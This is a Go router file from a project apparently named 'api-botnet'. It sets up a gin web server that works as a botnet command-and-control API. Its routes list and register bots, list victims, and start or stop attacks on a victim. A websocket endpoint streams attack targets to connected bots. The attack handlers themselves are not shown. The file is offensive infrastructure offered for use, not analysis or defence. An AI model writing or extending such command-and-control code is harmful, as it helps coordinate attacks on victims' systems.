package router

import (
	"api-botnet/cmd/globals"
	"api-botnet/handlers"
	"fmt"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

func SetupRouter() *gin.Engine {
	r := gin.Default()
	r.GET("/ping", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"message": "pong",
		})
	})

	r.GET("/bots", handlers.GetAllBots)
	r.POST("/bot/create", handlers.Create)

	r.GET("/victims", handlers.GetAllVictims)
	// r.POST("victim/create", handlers.CreateVictim)
	r.POST("victim/attack", handlers.AttackVictim)
	r.POST("victim/stopAttack", handlers.StopVictimAttack)

	r.GET("/ws", func(c *gin.Context) {
		conn, err := globals.Upgrader.Upgrade(c.Writer, c.Request, nil)
		if err != nil {
			return
		}
		defer conn.Close()
		for {
			select {
			case attackMessage := <-globals.AttackChan:
				fmt.Println("START ATTACKING to: " + attackMessage)
				conn.WriteMessage(websocket.TextMessage, []byte(attackMessage))
			}
		}
	})

	return r
}
